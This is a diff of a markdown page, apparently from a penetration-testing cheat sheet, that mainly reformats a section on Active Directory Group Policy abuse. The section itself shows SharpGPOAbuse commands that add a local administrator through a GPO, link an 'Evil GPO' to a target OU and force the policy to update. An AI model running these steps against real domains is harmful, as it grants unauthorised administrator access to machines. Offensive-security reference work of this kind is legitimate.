@@ -59,9 +59,14 @@ Get-GPOReport -Name '<GPO_NAME>' -ReportType XML
 Get-GPOReport -Name '<GPO_NAME>' -ReportType HTML -Path "C:\ProgramData\GPOReport.html"
 ```
 
-### Abuse #1: Add local admin
+---
 
-#### 1. Add localAdmin
+### Abuse #1: Add Local Admin
+
+{{< tab set1 tab1 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+#### 1. Add Local Admin
 
 ```console
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
@@ -82,7 +87,7 @@ Get-GPOReport -Name '<GPO_NAME>' -ReportType HTML -Path "C:\ProgramData\GPORepor
 [+] Done!
 ```
 
-#### 2. Force reload
+#### 2. Force Reload
 
 ```console
 gpupdate /force
@@ -126,7 +131,14 @@ The command completed successfully.
 
 <small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>
 
+{{< /tabcontent >}}
+
+---
+
 ### Abuse #2: WriteGPLink
+
+{{< tab set2 tab1 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
 
 #### 1. Create a New GPO
 
@@ -140,13 +152,13 @@ New-GPO -Name "Evil GPO"
 Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=<TARGET>,DC=<DOMAIN>,DC=<COM>"
 ```
 
-#### 3. Add localAdmin
+#### 3. Add Local Admin
 
 ```console
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName 'Evil GPO'
 ```
 
-#### 4. Force reload
+#### 4. Force Reload
 
 ```console
 gpupdate /force
@@ -157,3 +169,5 @@ gpupdate /force
 ```console
 net user '<USER>'
 ```
+
+{{< /tabcontent >}}
